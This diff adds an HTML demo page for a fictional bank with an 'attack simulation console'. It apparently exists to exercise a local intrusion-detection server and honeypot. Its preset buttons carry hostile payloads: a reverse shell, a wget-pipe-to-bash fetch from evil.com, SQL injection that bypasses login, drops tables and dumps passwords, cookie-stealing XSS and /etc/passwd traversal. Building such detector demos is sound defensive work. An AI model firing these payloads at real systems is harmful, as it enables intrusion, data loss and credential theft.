@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>NexaBank — Secure Banking</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--bl:#1d4ed8;--bl2:#1e40af;--bl3:#3b82f6;--bg:#f0f4ff;--bdr:#dde6f5;--txt:#0f172a;--t2:#475569;--t3:#94a3b8;--red:#dc2626;--grn:#16a34a;}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;}
+nav{background:#fff;border-bottom:1px solid var(--bdr);padding:0 48px;height:64px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:99;box-shadow:0 2px 6px rgba(0,0,0,.06);}
+.nlogo{display:flex;align-items:center;gap:10px;font-size:19px;font-weight:800;color:var(--bl);}
+.nli{width:36px;height:36px;background:linear-gradient(135deg,var(--bl),var(--bl3));border-radius:9px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:17px;font-weight:800;}
+.nr{display:flex;align-items:center;gap:6px;}
+.nl{padding:8px 14px;border-radius:8px;font-size:13px;color:var(--t2);cursor:pointer;}
+.nl:hover{background:var(--bg);}
+.nb{padding:8px 18px;border-radius:8px;font-size:13px;font-weight:600;background:var(--bl);color:#fff;cursor:pointer;border:none;transition:.15s;}
+.nb:hover{background:var(--bl2);}
+.nb.dk{background:#0f172a;}.nb.dk:hover{background:#1e293b;}
+.hero{background:linear-gradient(135deg,#1d4ed8,#1e3a8a 55%,#0f172a);color:#fff;padding:84px 48px;text-align:center;position:relative;overflow:hidden;}
+.hero::before{content:'';position:absolute;inset:0;background-image:radial-gradient(ellipse at 25% 40%,rgba(59,130,246,.1),transparent 55%);}
+.hc{position:relative;max-width:660px;margin:0 auto;}
+.hbdg{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;border-radius:20px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);font-size:12px;font-weight:500;margin-bottom:22px;}
+.hbdot{width:6px;height:6px;border-radius:50%;background:#4ade80;box-shadow:0 0 5px #4ade80;animation:blink 2s infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.hc h1{font-size:46px;font-weight:800;line-height:1.1;margin-bottom:16px;letter-spacing:-.7px;}
+.hc p{font-size:17px;opacity:.78;margin-bottom:34px;line-height:1.6;}
+.hcta{display:flex;gap:12px;justify-content:center;}
+.cp{padding:14px 30px;border-radius:10px;background:#fff;color:var(--bl);font-weight:700;font-size:14px;cursor:pointer;border:none;transition:.2s;}
+.cp:hover{transform:translateY(-2px);box-shadow:0 10px 26px rgba(0,0,0,.22);}
+.cs{padding:14px 30px;border-radius:10px;background:rgba(255,255,255,.1);color:#fff;font-weight:500;font-size:14px;cursor:pointer;border:1px solid rgba(255,255,255,.2);}
+.main{max-width:1100px;margin:0 auto;padding:60px 48px;}
+.feats{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-bottom:60px;}
+.fc{background:#fff;border:1px solid var(--bdr);border-radius:15px;padding:26px;transition:.2s;}
+.fc:hover{transform:translateY(-3px);box-shadow:0 14px 36px rgba(0,0,0,.08);border-color:#bfdbfe;}
+.fi{width:46px;height:46px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:16px;}
+.fc h3{font-size:16px;font-weight:700;margin-bottom:7px;}
+.fc p{font-size:14px;color:var(--t2);line-height:1.5;}
+.ap{background:#fff;border:2px solid #bfdbfe;border-radius:18px;padding:38px;margin-bottom:50px;box-shadow:0 6px 22px rgba(29,78,216,.07);}
+.apt{display:flex;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:10px;}
+.apt h2{font-size:21px;font-weight:800;letter-spacing:-.3px;}
+.tag{font-size:10px;font-weight:700;border-radius:20px;padding:3px 11px;letter-spacing:.04em;}
+.t-demo{background:#fef3c7;color:#92400e;border:1px solid #fcd34d;}
+.t-live{background:#fef2f2;color:#991b1b;border:1px solid #fca5a5;}
+.t-ss{background:#f0f9ff;color:#0369a1;border:1px solid #7dd3fc;}
+.ap-desc{font-size:14px;color:var(--t2);margin-bottom:28px;line-height:1.6;max-width:680px;}
+.frow{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px;}
+.fg{display:flex;flex-direction:column;gap:6px;}
+.fg label{font-size:11px;font-weight:700;color:var(--t2);letter-spacing:.05em;text-transform:uppercase;}
+.fg select,.fg input{padding:10px 13px;border:1.5px solid var(--bdr);border-radius:9px;font-size:13px;font-family:'Inter',sans-serif;color:var(--txt);background:var(--bg);outline:none;transition:.15s;}
+.fg select:focus,.fg input:focus{border-color:var(--bl3);background:#fff;box-shadow:0 0 0 3px rgba(59,130,246,.1);}
+.payload{width:100%;padding:11px 13px;border:1.5px solid var(--bdr);border-radius:9px;font-size:12px;font-family:'Courier New',monospace;color:#1e293b;background:#f8fafc;resize:vertical;min-height:72px;outline:none;transition:.15s;}
+.payload:focus{border-color:var(--bl3);background:#fff;box-shadow:0 0 0 3px rgba(59,130,246,.1);}
+.presets{display:flex;flex-wrap:wrap;gap:7px;margin:12px 0 18px;}
+.pb{padding:5px 13px;border-radius:20px;font-size:12px;font-weight:600;cursor:pointer;border:1.5px solid;transition:.18s;background:#fff;}
+.pb:hover{transform:translateY(-2px);box-shadow:0 4px 10px rgba(0,0,0,.1);}
+.pb.rce{color:#991b1b;border-color:#fca5a5;}.pb.rce:hover{background:#fef2f2;}
+.pb.sql{color:#92400e;border-color:#fcd34d;}.pb.sql:hover{background:#fffbeb;}
+.pb.xss{color:#5b21b6;border-color:#c4b5fd;}.pb.xss:hover{background:#f5f3ff;}
+.pb.lfi{color:#065f46;border-color:#6ee7b7;}.pb.lfi:hover{background:#ecfdf5;}
+.pb.safe{color:#14532d;border-color:#a7f3d0;}.pb.safe:hover{background:#f0fdf4;}
+.arow{display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
+.abtn{padding:13px 28px;background:linear-gradient(135deg,#dc2626,#b91c1c);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;transition:.2s;display:flex;align-items:center;gap:8px;}
+.abtn:hover{transform:translateY(-2px);box-shadow:0 8px 22px rgba(220,38,38,.28);}
+.abtn:active{transform:scale(.97);}
+.abtn.loading{opacity:.7;pointer-events:none;}
+.sbtn{padding:13px 22px;background:linear-gradient(135deg,#16a34a,#15803d);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;transition:.2s;}
+.sbtn:hover{transform:translateY(-2px);}
+.hint{font-size:12px;color:var(--t3);}
+.rbox{margin-top:18px;padding:15px 18px;border-radius:10px;font-size:14px;line-height:1.6;display:none;animation:fi .3s ease;}
+.rbox.threat{background:#fef2f2;border:1.5px solid #fca5a5;color:#991b1b;}
+.rbox.safe{background:#f0fdf4;border:1.5px solid #a7f3d0;color:#14532d;}
+@keyframes fi{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+.sbar2{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin-bottom:60px;}
+.si{text-align:center;padding:26px;background:#fff;border:1px solid var(--bdr);border-radius:15px;transition:.2s;}
+.si:hover{transform:translateY(-3px);box-shadow:0 12px 26px rgba(0,0,0,.07);}
+.sn{font-size:34px;font-weight:800;color:var(--bl);margin-bottom:4px;}.sl{font-size:13px;color:var(--t2);}
+footer{background:#0f172a;color:#475569;text-align:center;padding:24px;font-size:12px;}
+footer a{color:var(--bl3);text-decoration:none;}
+#ov{position:fixed;inset:0;background:rgba(0,0,0,.76);z-index:9999;display:none;align-items:center;justify-content:center;backdrop-filter:blur(6px);}
+#ov.show{display:flex;animation:fi .3s ease;}
+.ob{background:#fff;border-radius:18px;padding:46px 54px;text-align:center;max-width:420px;box-shadow:0 32px 60px rgba(0,0,0,.3);}
+.oi{font-size:52px;margin-bottom:16px;}
+.ot{font-size:21px;font-weight:800;color:var(--red);margin-bottom:10px;}
+.os{font-size:14px;color:var(--t2);margin-bottom:26px;line-height:1.5;}
+.obar{height:5px;background:#e2e8f0;border-radius:3px;overflow:hidden;}
+.of{height:100%;background:var(--red);width:0%;transition:width 2.2s linear;border-radius:3px;}
+</style>
+</head>
+<body>
+<nav>
+  <div class="nlogo"><div class="nli">N</div>NexaBank</div>
+  <div class="nr">
+    <span class="nl">Personal</span><span class="nl">Business</span><span class="nl">Investments</span>
+    <a href="ss_dashboard.html" style="text-decoration:none"><button class="nb dk">🛡 SyscallSentinel</button></a>
+    <button class="nb">Sign In</button>
+  </div>
+</nav>
+<div class="hero">
+  <div class="hc">
+    <div class="hbdg"><div class="hbdot"></div>Protected by SyscallSentinel AI · Port 4000</div>
+    <h1>Banking built for the modern world</h1>
+    <p>Instant transfers, zero fees, AI-powered real-time fraud detection. Trusted by 2M+ customers.</p>
+    <div class="hcta"><button class="cp">Open Account</button><button class="cs">Watch Demo</button></div>
+  </div>
+</div>
+<div class="main">
+  <div class="feats">
+    <div class="fc"><div class="fi" style="background:#eff6ff">💳</div><h3>Instant Transfers</h3><p>Move money globally in seconds across 140+ countries with zero hidden fees.</p></div>
+    <div class="fc"><div class="fi" style="background:#f0fdf4">🔒</div><h3>Bank-Grade Security</h3><p>SyscallSentinel AI monitors every request at the kernel level in real time.</p></div>
+    <div class="fc"><div class="fi" style="background:#faf5ff">📊</div><h3>Smart Analytics</h3><p>AI-powered insights with automated categorization and threat forecasting.</p></div>
+  </div>
+  <div class="ap">
+    <div class="apt">
+      <h2>🔴 Attack Simulation Console</h2>
+      <span class="tag t-demo">DEMO MODE</span>
+      <span class="tag t-live">⚡ KERNEL MONITORED</span>
+      <span class="tag t-ss">🛡 SyscallSentinel Port 4000</span>
+    </div>
+    <p class="ap-desc">Simulate real-world attack vectors against this banking portal. SyscallSentinel's kernel-level AI (port 4000) detects and classifies each attempt in real time — malicious payloads automatically redirect the attacker to the honeypot decoy and update the dashboard live.</p>
+    <div class="frow">
+      <div class="fg"><label>Target Endpoint</label>
+        <select id="ep"><option>/api/v1/auth/login</option><option>/api/v1/transfer/execute</option><option>/api/v1/account/profile</option><option>/api/v1/admin/users</option><option>/api/v1/search/transactions</option></select>
+      </div>
+      <div class="fg"><label>Attack Type</label>
+        <select id="av"><option value="RCE">Remote Code Execution (RCE)</option><option value="SQLi">SQL Injection</option><option value="XSS">Cross-Site Scripting</option><option value="LFI">Local File Inclusion</option><option value="NORMAL">Normal / Benign</option></select>
+      </div>
+    </div>
+    <div class="fg" style="margin-bottom:6px"><label>Payload</label>
+      <textarea class="payload" id="payload">/bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1</textarea>
+    </div>
+    <div class="presets">
+      <span class="pb rce" onclick="sp('/bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1')">💀 RCE — Reverse Shell</span>
+      <span class="pb rce" onclick="sp('wget http://evil.com/malware.sh | bash')">💀 RCE — Malware Drop</span>
+      <span class="pb rce" onclick="sp('exec(\"/bin/bash -c whoami\")')">💀 RCE — Exec Inject</span>
+      <span class="pb sql" onclick="sp(&quot;' OR 1=1 -- &quot;)">🗃 SQLi — Auth Bypass</span>
+      <span class="pb sql" onclick="sp(&quot;'; DROP TABLE users; --&quot;)">🗃 SQLi — Drop Table</span>
+      <span class="pb sql" onclick="sp(&quot;' UNION SELECT username,password FROM users --&quot;)">🗃 SQLi — Data Dump</span>
+      <span class="pb xss" onclick='sp("<script>document.location=`//evil.com?c=`+document.cookie<\/script>")'>⚡ XSS — Cookie Steal</span>
+      <span class="pb xss" onclick='sp("<img src=x onerror=fetch(`//evil.com?d=`+document.cookie)>")'>⚡ XSS — Exfil</span>
+      <span class="pb lfi" onclick="sp('../../../etc/passwd')">📂 LFI — /etc/passwd</span>
+      <span class="pb safe" onclick="sp('user_id=12345&amount=250.00&currency=USD')">✅ Normal Request</span>
+    </div>
+    <div class="arow">
+      <button class="abtn" id="abtn" onclick="launch()"><span id="albl">🚀 Launch Attack</span></button>
+      <button class="sbtn" onclick="sp('user_id=99&action=view_balance');launch()">✅ Safe Request</button>
+      <span class="hint">Monitored by SyscallSentinel · Port 4000 · Results appear on dashboard in real time</span>
+    </div>
+    <div class="rbox" id="rbox"></div>
+  </div>
+  <div class="sbar2">
+    <div class="si"><div class="sn">2.4M</div><div class="sl">Active Customers</div></div>
+    <div class="si"><div class="sn">$12B</div><div class="sl">Processed Daily</div></div>
+    <div class="si"><div class="sn">99.99%</div><div class="sl">Uptime SLA</div></div>
+    <div class="si"><div class="sn">140+</div><div class="sl">Countries</div></div>
+  </div>
+</div>
+<footer>© 2024 NexaBank · <a href="ss_dashboard.html">🛡 SyscallSentinel SOC</a> · Demo interface · Port 4000</footer>
+<div id="ov"><div class="ob"><div class="oi">🚨</div><div class="ot">THREAT DETECTED</div><div class="os" id="om">Malicious payload identified by SyscallSentinel. Isolating attacker in honeypot…</div><div class="obar"><div class="of" id="of"></div></div></div></div>
+<script>
+const S='http://localhost:4000';
+function sp(p){document.getElementById('payload').value=p;}
+async function launch(){
+  const payload=document.getElementById('payload').value.trim();if(!payload)return;
+  const btn=document.getElementById('abtn'),lbl=document.getElementById('albl');
+  btn.classList.add('loading');lbl.textContent='⏳ SyscallSentinel analyzing…';
+  document.getElementById('rbox').style.display='none';
+  try{
+    const res=await fetch(`${S}/ss/attack`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({payload})});
+    const d=await res.json();
+    btn.classList.remove('loading');lbl.textContent='🚀 Launch Attack';
+    if(d.is_threat){
+      const rbox=document.getElementById('rbox');rbox.className='rbox threat';
+      rbox.innerHTML=`<strong>🚨 THREAT DETECTED — ${d.type}</strong><br>Score: <strong>${d.score}</strong> · ID: <strong>${d.id}</strong> · Level: <strong>${d.threat_level}</strong><br><em style="color:#7f1d1d">${d.xai}</em><br><br>⚠ Redirecting to honeypot in 2 seconds… <a href="ss_dashboard.html" style="color:#1d4ed8">View dashboard →</a>`;
+      rbox.style.display='block';
+      setTimeout(()=>{document.getElementById('om').innerHTML=`<strong>[${d.type}]</strong> ${d.xai}<br>Event: ${d.id}`;const ov=document.getElementById('ov');ov.classList.add('show');requestAnimationFrame(()=>{document.getElementById('of').style.width='100%';});setTimeout(()=>{window.location.href=`ss_decoy.html?type=${d.type}&id=${d.id}&score=${d.score}&level=${d.threat_level}`;},2300);},700);
+    }else{
+      const rbox=document.getElementById('rbox');rbox.className='rbox safe';
+      rbox.innerHTML=`<strong>✅ No Threat — NORMAL / BENIGN</strong><br>Score: ${d.score} · ID: ${d.id}<br><em style="color:#166534">${d.xai}</em> · <a href="ss_dashboard.html" style="color:#16a34a">View dashboard →</a>`;
+      rbox.style.display='block';
+    }
+  }catch(e){
+    btn.classList.remove('loading');lbl.textContent='🚀 Launch Attack';
+    const rbox=document.getElementById('rbox');rbox.className='rbox threat';
+    rbox.innerHTML='<strong>⚠ Cannot connect to SyscallSentinel</strong><br>Run: <code>node ss_server.js</code> (starts on port 4000)';rbox.style.display='block';
+  }
+}
+</script>
+</body>
+</html>
